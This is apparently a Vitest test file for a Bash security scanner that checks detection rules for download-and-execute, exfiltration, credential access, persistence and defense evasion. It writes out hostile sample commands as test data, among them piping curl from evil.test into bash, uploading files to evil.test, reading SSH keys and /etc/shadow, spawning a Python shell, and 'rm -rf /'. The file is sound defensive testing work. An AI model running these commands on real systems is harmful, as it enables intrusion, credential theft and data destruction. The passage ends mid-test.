import { describe, expect, it } from "vitest";
import { scan } from "../src/index.js";
import type { RiskCategory } from "../src/types.js";

describe("scan", () => {
  const categorySamples: Record<RiskCategory, string> = {
    download_execution: "curl https://evil.test/a | bash",
    dynamic_execution: "eval \"$payload\"",
    persistence: "crontab /tmp/jobs",
    credential_access: "cat ~/.ssh/id_rsa",
    system_modification: "echo x > /etc/hosts",
    privilege_escalation: "sudo id",
    defense_evasion: "rm /var/log/audit.log",
    network_egress: "curl https://evil.test",
    data_exfiltration: "curl -T /tmp/data https://evil.test/u",
    destructive_behavior: "rm -rf /",
    interpreter_escape: "python -c \"$payload\"",
    second_stage_payload: "wget https://evil.test/a.tar.gz\ntar xzf a.tar.gz\n./install.sh",
  };

  for (const [category, source] of Object.entries(categorySamples)) {
    it(`covers ${category} in Bash`, () => {
      expect(scan(source).findings.some((finding) => finding.category === category)).toBe(true);
    });
  }

  it("detects a download-to-shell pipeline once", () => {
    const result = scan("curl -fsSL https://example.test/a.sh | bash\n");
    expect(result.findings.filter((f) => f.ruleId === "chain.download-execute")).toHaveLength(1);
    expect(result.findings.some((f) => f.category === "network_egress")).toBe(true);
  });

  it("detects rsync only when an operand is a remote endpoint", () => {
    const remoteTransfers = [
      "rsync -r atomic@example.test:/srv/source /tmp/destination",
      "rsync -az /tmp/source backup.example.test:/srv/destination",
      "rsync rsync://mirror.example.test/module/file /tmp/file",
      "rsync -av mirror.example.test::module /tmp/module",
      "rsync -e ssh '[2001:db8::1]:/srv/source' /tmp/destination",
    ];
    for (const source of remoteTransfers) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "network.rsync-remote",
          category: "network_egress",
        }),
      ]));
    }

    const hardNegatives = [
      "rsync -a /tmp/source /tmp/destination",
      "rsync -a ./report:2026.txt /tmp/archive/",
      "rsync -a ../report:2026.txt /tmp/archive/",
      "rsync --exclude=mirror.example.test:/cache /tmp/source /tmp/destination",
      "rsync -e 'ssh -p 2222' /tmp/source /tmp/destination",
      "rsync --help",
      "rsync --version",
      "echo 'rsync user@example.test:/source /tmp/destination'",
      "# rsync rsync://mirror.example.test/module /tmp/module",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "network.rsync-remote"
      )).toBe(false);
    }
  });

  it("detects only static local-to-remote rsync pushes as data exfiltration", () => {
    const pushes = [
      "rsync -r /tmp/source user@example.test:/srv/destination",
      "rsync -az ./a ./b rsync://mirror.example.test/module/destination",
      "rsync -e 'ssh -p 2222' /tmp/source backup.example.test::module",
      "rsync --exclude '*.tmp' /tmp/source '[2001:db8::1]:/srv/destination'",
    ];
    for (const source of pushes) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "exfil.rsync-push",
          category: "data_exfiltration",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "rsync user@example.test:/srv/source /tmp/destination",
      "rsync -a /tmp/source /tmp/destination",
      "rsync --dry-run /tmp/source user@example.test:/srv/destination",
      "rsync -avn /tmp/source user@example.test:/srv/destination",
      "rsync source.example.test:/a backup.example.test:/b",
      "rsync \"$SOURCE\" user@example.test:/srv/destination",
      "rsync user@example.test:/srv/destination",
      "echo 'rsync /tmp/source user@example.test:/srv/destination'",
      "# rsync /tmp/source user@example.test:/srv/destination",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "exfil.rsync-push"
      )).toBe(false);
    }
  });

  it("detects only static local-to-remote SCP pushes as data exfiltration", () => {
    const pushes = [
      "scp /tmp/report.txt analyst@example.test:/srv/inbox/report.txt",
      "sudo scp -P 2222 -i /tmp/test-key ./one.txt ./two.txt user@[2001:db8::10]:/tmp/",
      "scp -- local.txt scp://user@example.test/tmp/local.txt",
    ];
    for (const source of pushes) {
      const findings = scan(source).findings;
      expect(findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "exfil.scp-push",
          category: "data_exfiltration",
          confidence: "high",
        }),
      ]));
      expect(findings.some((finding) =>
        finding.ruleId === "exfil.upload"
      )).toBe(false);
    }

    const hardNegatives = [
      "scp analyst@example.test:/srv/report.txt /tmp/report.txt",
      "scp user@one.example:/a user@two.example:/b",
      "scp /tmp/one.txt /tmp/two.txt",
      "scp \"$source\" analyst@example.test:/srv/report.txt",
      "scp /tmp/report.txt \"$destination\"",
      "scp --help",
      "echo 'scp /tmp/report.txt analyst@example.test:/srv/report.txt'",
      "# scp /tmp/report.txt analyst@example.test:/srv/report.txt",
    ];
    for (const source of hardNegatives) {
      const findings = scan(source).findings;
      expect(findings.some((finding) =>
        finding.ruleId === "exfil.scp-push"
        || finding.ruleId === "exfil.upload"
      ), source).toBe(false);
    }

    const readThenPull = scan(`
      cat /tmp/local-metadata
      scp analyst@example.test:/srv/report.txt /tmp/report.txt
    `);
    expect(readThenPull.findings.some((finding) =>
      finding.ruleId === "chain.read-upload"
    )).toBe(false);

    const readThenPush = scan(`
      cat /tmp/local-report
      scp /tmp/local-report analyst@example.test:/srv/report.txt
    `);
    expect(readThenPush.findings.some((finding) =>
      finding.ruleId === "chain.read-upload"
    )).toBe(true);
  });

  it("tracks Python interpreters selected only from trusted discovery candidates", () => {
    const result = scan(`
      which_python=$(which python || which python3 || command -v python3.12)
      $which_python -c "import pty; pty.spawn('/bin/sh')"
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "escape.discovered-python",
        category: "interpreter_escape",
      }),
      expect.objectContaining({
        ruleId: "dynamic.discovered-python-command",
        category: "dynamic_execution",
      }),
    ]));

    const hardNegatives = [
      `runner=$(which python || which sh); $runner -c "$code"`,
      `runner=$(command -v custom-runtime); $runner -c "$code"`,
      `runner=python3; $runner -c "$code"`,
      `runner=$(which python3); $runner --version`,
      `runner=$(which python3); $runner /tmp/script.py`,
      `runner=$(which python3); runner=/tmp/custom; $runner -c "$code"`,
      `echo '$which_python -c "print(1)"'`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "escape.discovered-python"
        || finding.ruleId === "dynamic.discovered-python-command"
      )).toBe(false);
    }
  });

  it("detects symmetric encryption only through a proven GPG executable variable", () => {
    const encryptionCommands = [
      `which_gpg=$(command -v gpg)
       printf '%s' "$password" | $which_gpg --batch --passphrase-fd 0 -o /tmp/data.gpg -c /tmp/data`,
      `gpg_bin=$(which gpg2)
       "$gpg_bin" --symmetric --output=/tmp/data.gpg /tmp/data`,
    ];
    for (const source of encryptionCommands) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "destructive.discovered-gpg-encryption",
          category: "destructive_behavior",
        }),
      ]));
    }

    const hardNegatives = [
      `tool=$(command -v openssl); $tool -o /tmp/data.gpg -c /tmp/data`,
      `tool=gpg; $tool -o /tmp/data.gpg -c /tmp/data`,
      `$unknown_gpg -o /tmp/data.gpg -c /tmp/data`,
      `tool=$(command -v gpg); tool=/tmp/custom; $tool -o /tmp/data.gpg -c /tmp/data`,
      `tool=$(command -v gpg); $tool --decrypt --output /tmp/plain /tmp/data.gpg`,
      `tool=$(command -v gpg); $tool --sign --output /tmp/data.sig /tmp/data`,
      `tool=$(command -v gpg); $tool --verify /tmp/data.sig /tmp/data`,
      `tool=$(command -v gpg); $tool --list-keys`,
      `tool=$(command -v gpg); $tool -c /tmp/data`,
      `tool=$(command -v gpg); echo '$tool -o /tmp/data.gpg -c /tmp/data'`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "destructive.discovered-gpg-encryption"
      )).toBe(false);
    }
  });

  it("detects file encryption only through a proven OpenSSL executable variable", () => {
    const encryptionCommands = [
      `which_openssl=$(command -v openssl)
       $which_openssl rsautl -encrypt -inkey /tmp/public.pem -pubin -in /tmp/plain -out /tmp/cipher`,
      `openssl_bin=$(which openssl)
       "$openssl_bin" pkeyutl -encrypt -inkey /tmp/public.pem -in /tmp/plain -out /tmp/cipher`,
      `ssl=$(command -v openssl)
       $ssl enc -aes-256-cbc -salt -in /tmp/plain -out /tmp/cipher`,
    ];
    for (const source of encryptionCommands) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "destructive.discovered-openssl-encryption",
          category: "destructive_behavior",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      `tool=$(command -v gpg); $tool rsautl -encrypt -inkey /tmp/key -in /tmp/a -out /tmp/b`,
      `tool=openssl; $tool rsautl -encrypt -inkey /tmp/key -in /tmp/a -out /tmp/b`,
      `$unknown_openssl rsautl -encrypt -inkey /tmp/key -in /tmp/a -out /tmp/b`,
      `tool=$(command -v openssl); tool=/tmp/custom; $tool rsautl -encrypt -inkey /tmp/key -in /tmp/a -out /tmp/b`,
      `tool=$(command -v openssl); $tool rsautl -decrypt -inkey /tmp/key -in /tmp/a -out /tmp/b`,
      `tool=$(command -v openssl); $tool rsautl -encrypt -in /tmp/a -out /tmp/b`,
      `tool=$(command -v openssl); $tool rsautl -encrypt -inkey /tmp/key -in /tmp/a`,
      `tool=$(command -v openssl); $tool genrsa -out /tmp/private.pem 2048`,
      `tool=$(command -v openssl); $tool req -new -key /tmp/private.pem -out /tmp/request.csr`,
      `tool=$(command -v openssl); $tool dgst -sha256 /tmp/plain`,
      `tool=$(command -v openssl); $tool enc -d -aes-256-cbc -in /tmp/a -out /tmp/b`,
      `tool=$(command -v openssl); $tool enc -in /tmp/a -out /tmp/b`,
      `tool=$(command -v openssl); $tool --help`,
      `tool=$(command -v openssl); echo '$tool rsautl -encrypt -inkey /tmp/key -in /tmp/a -out /tmp/b'`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "destructive.discovered-openssl-encryption"
      )).toBe(false);
    }
  });

  it("classifies static interpreter inline-code switches as dynamic execution", () => {
    const commands = [
      "python3 -c 'print(1)'",
      "perl -e 'print 1'",
      "ruby -e 'puts 1'",
      "node --eval 'console.log(1)'",
      "php -r 'echo 1;'",
      "osascript -e 'return 1'",
      "pwsh -Command 'Get-Date'",
    ];
    for (const source of commands) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "dynamic.interpreter-inline-code"
      )).toBe(true);
    }
    expect(scan("python3 /tmp/script.py").findings.some((finding) =>
      finding.ruleId === "dynamic.interpreter-inline-code"
    )).toBe(false);
  });

  it("detects real awk system calls that statically launch a shell", () => {
    const shellEscapes = [
      `awk 'BEGIN {system("/bin/sh &")}'`,
      `gawk -F: 'BEGIN { system("bash -i") }' /etc/passwd`,
      `mawk -v mode=test '$1 == "run" {system("exec /bin/dash")}' /tmp/input`,
      `nawk 'BEGIN {system("/usr/bin/env sh -c true")}'`,
    ];
    for (const source of shellEscapes) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "dynamic.awk-system-shell",
          category: "dynamic_execution",
          confidence: "high",
        }),
        expect.objectContaining({
          ruleId: "escape.awk-system-shell",
          category: "interpreter_escape",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      `awk '{sum += $1} END {print sum}' /tmp/input`,
      `awk 'BEGIN {print "system(\\"/bin/sh\\")"}'`,
      `awk '/system\\(\\"\\/bin\\/sh\\"\\)/ {print}' /tmp/input`,
      `awk 'BEGIN {# system("/bin/sh")\nprint "ok"}'`,
      `awk 'function mysystem(value) {print value} BEGIN {mysystem("/bin/sh")}'`,
      `awk 'BEGIN {system(command)}'`,
      `awk 'BEGIN {system("$SHELL")}'`,
      `awk 'BEGIN {system("date")}'`,
      `awk 'BEGIN {system("python3 -c pass")}'`,
      `awk -f /tmp/report.awk /tmp/input`,
      `awk --help`,
      `echo 'awk '\\''BEGIN {system("/bin/sh")} '\\'''`,
      `# awk 'BEGIN {system("/bin/sh")}'`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "dynamic.awk-system-shell"
        || finding.ruleId === "escape.awk-system-shell"
      ), source).toBe(false);
    }
  });

  it("detects Python HTTP file servers as network exposure and data exfiltration", () => {
    const servers = [
      "python3 -m http.server",
      "python -m http.server 8080",
      "python3 -m http.server --directory /tmp/share 19090",
      "sudo python3 -m http.server 8000 --bind 0.0.0.0",
    ];
    for (const source of servers) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "network.python-http-server",
          category: "network_egress",
        }),
        expect.objectContaining({
          ruleId: "exfil.python-http-server",
          category: "data_exfiltration",
        }),
      ]));
    }

    const hardNegatives = [
      "python3 -m http.server --help",
      "python3 -m http.server -h",
      "python3 -m http.client",
      "python3 -m compileall /tmp/project",
      "python3 /tmp/http_server.py",
      "runner='python3 -m http.server 8000'",
      "echo 'python3 -m http.server 8000'",
      "# python3 -m http.server 8000",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "network.python-http-server"
        || finding.ruleId === "exfil.python-http-server"
      )).toBe(false);
    }
  });

  it("detects staged archive execution", () => {
    const result = scan(`
      wget https://example.test/tool.tar.gz -O /tmp/tool.tar.gz
      tar xzf /tmp/tool.tar.gz -C /tmp
      /tmp/tool/install.sh
    `);
    expect(result.findings.some((f) => f.category === "second_stage_payload")).toBe(true);
  });

  it("links a static download output to chmod and execution of the same script", () => {
    const stagedScripts = [
      `curl -sO https://example.test/agent.sh
       chmod +x agent.sh
       bash agent.sh`,
      `curl -fsSL https://example.test/agent -o /tmp/agent
       chmod 755 /tmp/agent
       /tmp/agent --install`,
      `wget https://example.test/agent.sh -O ./agent.sh
       chmod u+x ./agent.sh
       sh ./agent.sh`,
    ];
    for (const source of stagedScripts) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "chain.second-stage-downloaded-script",
          category: "second_stage_payload",
        }),
      ]));
    }

    const hardNegatives = [
      "curl -sO https://example.test/agent.sh",
      "curl -sO https://example.test/agent.sh; chmod +x agent.sh",
      "curl -sO https://example.test/agent.sh; chmod +x helper.sh; bash helper.sh",
      "curl -o agent.sh https://example.test/a; chmod +x agent.sh; bash helper.sh",
      "touch agent.sh; chmod +x agent.sh; bash agent.sh",
      `download() { curl -o agent.sh https://example.test/a; }
       chmod +x agent.sh
       bash agent.sh`,
      "echo 'curl -sO https://example.test/agent.sh; chmod +x agent.sh; bash agent.sh'",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "chain.second-stage-downloaded-script"
      )).toBe(false);
    }
  });

  it("tracks a variable-derived archive through extraction and execution", () => {
    const result = scan(`
      archive_uri=https://example.test/tool.zip
      exe=$HOME/.local/bin/tool
      curl --fail --output "$exe.zip" "$archive_uri"
      unzip -oqd "$HOME/.local/bin" "$exe.zip"
      mv "$HOME/.local/bin/tool-release/tool" "$exe"
      chmod +x "$exe"
      TOOL_UPDATE=true $exe completions
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "chain.archive-output-execute",
        category: "download_execution",
      }),
      expect.objectContaining({
        ruleId: "chain.second-stage-variable-archive",
        category: "second_stage_payload",
      }),
    ]));

    const storedOnly = scan(`
      curl --output "$artifact.zip" "$url"
      unzip "$artifact.zip" -d "$cache"
      chmod +x "$other_file"
    `);
    expect(storedOnly.findings.some((finding) =>
      finding.ruleId === "chain.archive-output-execute"
      || finding.ruleId === "chain.second-stage-variable-archive"
    )).toBe(false);
  });

  it("classifies eval or run only after proving a downloaded runtime", () => {
    const result = scan(`
      runtime=$HOME/.local/bin/deno
      curl --output "$runtime.zip" "$runtime_url"
      unzip "$runtime.zip" -d "$HOME/.local/bin"
      chmod +x "$runtime"
      $runtime eval "$code"
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "chain.downloaded-interpreter",
        category: "interpreter_escape",
      }),
      expect.objectContaining({
        ruleId: "chain.downloaded-dynamic-code",
        category: "dynamic_execution",
      }),
    ]));

    const unproven = scan(`
      helper=$HOME/bin/project-helper
      $helper run task
      echo '$helper eval code'
    `);
    expect(unproven.findings.some((finding) =>
      finding.ruleId === "chain.downloaded-interpreter"
      || finding.ruleId === "chain.downloaded-dynamic-code"
    )).toBe(false);
  });

  it("detects login-shell changes, zsh execution, and rc replacement with command boundaries", () => {
    const result = scan(`
      mv -f "$zdot/.zshrc-omztemp" "$zdot/.zshrc"
      sudo chsh -s "$zsh" "$USER"
      exec zsh -l
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "persistence.shell-rc-replace",
        category: "persistence",
      }),
      expect.objectContaining({
        ruleId: "system.login-shell",
        category: "system_modification",
      }),
      expect.objectContaining({
        ruleId: "escape.interpreter",
        category: "interpreter_escape",
      }),
    ]));

    const hardNegative = scan(`
      command_exists() { command -v "$@" >/dev/null 2>&1; }
      command_exists zsh
      mv "$zdot/.zshrc" "$backup_file"
      chsh --help
      echo "exec zsh -l"
    `);
    expect(hardNegative.findings.some((finding) =>
      finding.ruleId === "persistence.shell-rc-replace"
      || finding.ruleId === "system.login-shell"
      || finding.ruleId === "escape.interpreter"
    )).toBe(false);
  });

  it("tracks startup-file variables used by compound redirects", () => {
    const result = scan(`
      zsh_config=$HOME/.zshrc
      commands=("export TOOL_HOME=$HOME/.tool" "export PATH=$TOOL_HOME/bin:$PATH")
      {
        for command in "\${commands[@]}"; do echo "$command"; done
      } >>"$zsh_config"

      logs=(/tmp/worker.log /tmp/audit-copy.log)
      for log in "\${logs[@]}"; do echo ok >>"$log"; done
    `);
    expect(result.findings.filter((finding) =>
      finding.ruleId === "persistence.shell-rc-variable"
    )).toHaveLength(1);
  });

  it("detects persistence and credential access", () => {
    const result = scan(`
      echo '* * * * * /tmp/a' | crontab -
      cat ~/.ssh/id_rsa
      echo evil >> ~/.bashrc
    `);
    expect(result.summary.byCategory.persistence).toBe(2);
    expect(result.summary.byCategory.credential_access).toBe(1);
  });

  it("detects Unix password-hash reads without matching ordinary account files or writes", () => {
    const credentialReads = [
      "sudo cat /etc/shadow > /tmp/shadow-copy",
      "grep '^root:' /etc/shadow",
      "awk -F: '$2 != \"!\" {print $1}' /etc/shadow",
      "cp /etc/master.passwd /tmp/master-passwd-copy",
      "getent shadow root",
      "getent --service=files gshadow",
      "find /etc -type f -name shadow",
      "while read line; do printf '%s\\n' \"$line\"; done < /etc/shadow",
      "exec 3< /etc/master.passwd",
    ];
    for (const source of credentialReads) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "credential.shadow-read",
          category: "credential_access",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "cat /etc/passwd",
      "cat /etc/group",
      "cat /tmp/etc/shadow",
      "cat /etc/shadow.bak",
      "cat /etc/shadow.d/account",
      "cat \"$credential_path\"",
      "echo disabled > /etc/shadow",
      "tee /etc/shadow < /tmp/replacement",
      "rm -f /etc/shadow",
      "touch /etc/shadow",
      "chmod 600 /etc/shadow",
      "stat /etc/shadow",
      "ls -l /etc/shadow",
      "find /tmp -name shadow",
      "find /etc -name shadow-copy",
      "getent passwd root",
      "cat --help",
      "echo 'cat /etc/shadow'",
      "# getent shadow root",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "credential.shadow-read"
      ), source).toBe(false);
    }
  });

  it("detects static shell-history suppression without matching normal history configuration", () => {
    const suppressions = [
      "export HISTFILE=\"/dev/null\"",
      "HISTFILE=/dev/null",
      "readonly HISTSIZE=0",
      "export HISTFILESIZE='0'",
      "HISTIGNORE='*'",
      "unset HISTFILE",
      "unset -v HISTFILE",
      "set +o history",
      "history -c",
    ];
    for (const source of suppressions) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "defense.history-disable",
          category: "defense_evasion",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "echo \"$HISTFILE\"",
      "export HISTFILE=\"$HOME/.bash_history\"",
      "HISTFILE=~/.bash_history",
      "export HISTSIZE=1000",
      "export HISTFILESIZE=2000",
      "export HISTIGNORE='ls*:pwd'",
      "export HISTCONTROL=ignoreboth",
      "export HISTFILE=\"$target\"",
      "HISTFILE=/dev/null env",
      "HISTSIZE=0 command env",
      "f() { local HISTFILE=/dev/null; echo ok; }",
      "unset OTHER_VARIABLE",
      "set -o history",
      "history",
      "history --help",
      "echo 'export HISTFILE=/dev/null'",
      "# export HISTSIZE=0",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "defense.history-disable"
      ), source).toBe(false);
    }
  });

  it("detects OCI session-token access without matching ordinary OCI or token files", () => {
    const credentialAccesses = [
      "find /home/alice/.oci/sessions -name token -type f",
      "find \"$HOME/.oci/sessions\" -type f -name 'token'",
      "cat ~/.oci/sessions/DEFAULT/token",
      "head -c 32 '/tmp/user/.oci/sessions/profile/token'",
      "cp /root/.oci/sessions/admin/token /tmp/copied-token",
      "grep -n . /Users/alice/.oci/sessions/DEFAULT/token",
    ];
    for (const source of credentialAccesses) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "credential.oci-session-token",
          category: "credential_access",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "find /home/alice/.oci -name config -type f",
      "find /home/alice/.oci/sessions -name metadata -type f",
      "find /srv/project -name token -type f",
      "find \"$oci_sessions\" -name token -type f",
      "cat ~/.oci/config",
      "cat ~/.oci/sessions/DEFAULT/metadata",
      "touch ~/.oci/sessions/DEFAULT/token",
      "rm ~/.oci/sessions/DEFAULT/token",
      "echo token > ~/.oci/sessions/DEFAULT/token",
      "find --help",
      "echo 'find ~/.oci/sessions -name token'",
      "# cat ~/.oci/sessions/DEFAULT/token",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "credential.oci-session-token"
      ), source).toBe(false);
    }
  });

  it("distinguishes crontab replacement from read, edit, and removal operations", () => {
    const replacements = [
      "crontab /tmp/jobs",
      "crontab -",
      "crontab -u root /tmp/jobs",
      "crontab --user root '/tmp/jobs file'",
    ];
    for (const source of replacements) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "persistence.scheduler"
      )).toBe(true);
    }

    const nonInstallOperations = [
      "crontab -l",
      "crontab -e",
      "crontab -r",
      "crontab -i -r",
      "crontab -u root -l",
      "crontab --user root -e",
      "crontab",
    ];
    for (const source of nonInstallOperations) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "persistence.scheduler"
      )).toBe(false);
    }
  });

  it("detects emond rule installation and activation without matching path mentions", () => {
    const persistenceWrites = [
      "sudo cp /tmp/payload.plist /etc/emond.d/rules/com.example.agent.plist",
      "install -m 600 /tmp/payload.plist '/etc/emond.d/rules/com.example.agent.plist'",
      "printf '%s' \"$plist\" > /etc/emond.d/rules/com.example.agent.plist",
      "sudo touch /private/var/db/emondClients/com.example.agent",
      "tee /private/var/db/emondClients/com.example.agent </dev/null",
    ];
    for (const source of persistenceWrites) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "persistence.emond"
      )).toBe(true);
    }

    const hardNegatives = [
      "ls -la /etc/emond.d/rules",
      "cat /etc/emond.d/rules/com.apple.emond.plist",
      "find /private/var/db/emondClients -type f",
      "cp /etc/emond.d/rules/com.example.agent.plist /tmp/emond-backup.plist",
      "cp /private/var/db/emondClients/com.example.agent /tmp/emond-client-backup",
      "rm -f /etc/emond.d/rules/com.example.agent.plist",
      "rm -f /private/var/db/emondClients/com.example.agent",
      "cp /tmp/input.plist /tmp/emond-rule.plist",
      "touch /tmp/emondClients",
      "echo '/etc/emond.d/rules/com.example.agent.plist'",
      "# touch /private/var/db/emondClients/com.example.agent",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "persistence.emond"
      )).toBe(false);
    }
  });

  it("distinguishes iptables flushes from inspection, backup, and restore operations", () => {
    const flushes = [
      "iptables -F",
      "sudo ip6tables --flush",
      "iptables -t filter -F INPUT",
      "iptables-nft -w 5 --flush OUTPUT",
      "ip6tables-legacy --table filter -F",
    ];
    for (const source of flushes) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "system.firewall-flush",
          category: "system_modification",
        }),
        expect.objectContaining({
          ruleId: "defense.firewall-flush",
          category: "defense_evasion",
        }),
      ]));
    }

    const hardNegatives = [
      "iptables -L -n",
      "iptables -S",
      "iptables -C INPUT -p tcp --dport 22 -j ACCEPT",
      "iptables-save > /tmp/iptables.rules",
      "iptables-restore < /tmp/iptables.rules",
      "ip6tables-save --counters",
      "echo 'iptables -F'",
      "# iptables --flush",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "system.firewall-flush"
        || finding.ruleId === "defense.firewall-flush"
        || (
          source.startsWith("iptables-save")
          && finding.ruleId === "system.sensitive-config"
        )
      )).toBe(false);
    }
  });

  it("detects deletion of static iptables deny rules without flagging administration", () => {
    const deletions = [
      "iptables -D OUTPUT -p tcp --dport 21 -j DROP",
      "sudo ip6tables --delete INPUT -s 2001:db8::/32 --jump REJECT",
      "iptables-nft -w 5 -t filter -D FORWARD -j DROP",
      "ip6tables-legacy --table filter --delete OUTPUT --jump=REJECT",
    ];
    for (const source of deletions) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "system.firewall-rule-delete",
          category: "system_modification",
          confidence: "high",
        }),
        expect.objectContaining({
          ruleId: "defense.firewall-rule-delete",
          category: "defense_evasion",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "iptables -D OUTPUT -p tcp --dport 21 -j ACCEPT",
      "iptables -D INPUT 1",
      "iptables -A OUTPUT -p tcp --dport 21 -j DROP",
      "iptables -I INPUT 1 -j REJECT",
      "iptables -C OUTPUT -j DROP",
      "iptables -L -n",
      "iptables-save > /tmp/iptables.rules",
      "iptables-restore < /tmp/iptables.rules",
      "iptables --help",
      "echo 'iptables -D OUTPUT -j DROP'",
      "# iptables --delete OUTPUT --jump REJECT",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "system.firewall-rule-delete"
        || finding.ruleId === "defense.firewall-rule-delete"
      ), source).toBe(false);
    }
  });

  it("detects static Linux ASLR disable writes without flagging reads or restoration", () => {
    const disables = [
      "sysctl -w kernel.randomize_va_space=0",
      "sudo sysctl --write kernel.randomize_va_space=0",
      "sysctl -q -w kernel/randomize_va_space=0",
      "echo 0 > /proc/sys/kernel/randomize_va_space",
      "echo -n '0' > '/proc/sys/kernel/randomize_va_space'",
      "printf '0\\n' >/proc/sys/kernel/randomize_va_space",
      "printf '%s\\n' 0 > /proc/sys/kernel/randomize_va_space",
    ];
    for (const source of disables) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "system.aslr-disable",
          category: "system_modification",
          confidence: "high",
        }),
        expect.objectContaining({
          ruleId: "defense.aslr-disable",
          category: "defense_evasion",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "sysctl kernel.randomize_va_space",
      "sysctl -n kernel.randomize_va_space",
      "sysctl -w kernel.randomize_va_space=2",
      "sysctl -w kernel.randomize_va_space=1",
      "sysctl -w net.ipv4.ip_forward=0",
      "sysctl -w kernel.randomize_va_space=$mode",
      "sysctl --system",
      "sysctl --help",
      "cat /proc/sys/kernel/randomize_va_space",
      "echo 2 > /proc/sys/kernel/randomize_va_space",
      "echo \"$mode\" > /proc/sys/kernel/randomize_va_space",
      "echo 0 > /tmp/randomize_va_space",
      "echo 'sysctl -w kernel.randomize_va_space=0'",
      "# sysctl -w kernel.randomize_va_space=0",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "system.aslr-disable"
        || finding.ruleId === "defense.aslr-disable"
      ), source).toBe(false);
    }
  });

  it("detects system trust-store modification without flagging certificate inspection", () => {
    const trustStoreChanges = [
      `security add-trusted-cert -d -r trustRoot -k "/Library/Keychains/System.keychain" root.crt`,
      `sudo security add-trusted-cert -r trustAsRoot root.crt`,
      "update-ca-certificates",
      "sudo update-ca-certificates --fresh",
      "update-ca-trust extract",
      "update-ca-trust enable",
      "update-ca-trust disable",
      "trust anchor root.pem",
      "trust anchor --remove root.pem",
    ];
    for (const source of trustStoreChanges) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "system.trust-root-install",
          category: "system_modification",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "security find-certificate -a -p",
      "security import root.pem -k login.keychain",
      "security verify-cert -c root.pem",
      "security help add-trusted-cert",
      "update-ca-certificates --help",
      "update-ca-certificates -h",
      "update-ca-trust check",
      "trust list",
      "trust extract --format=pem-bundle",
      "openssl verify root.pem",
      "echo 'security add-trusted-cert root.pem'",
      "# update-ca-certificates",
      `security() { echo "project certificate helper"; }
       security add-trusted-cert root.pem`,
      `function update-ca-certificates { echo "project helper"; }
       update-ca-certificates`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "system.trust-root-install"
      ), source).toBe(false);
    }

    const bypassesShadow = scan(`
      security() { echo "project helper"; }
      command security add-trusted-cert root.pem
      sudo security add-trusted-cert root.pem
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "system.trust-root-install"
    )).toHaveLength(2);
  });

  it("detects transient systemd timers without matching ordinary transient services", () => {
    const timers = [
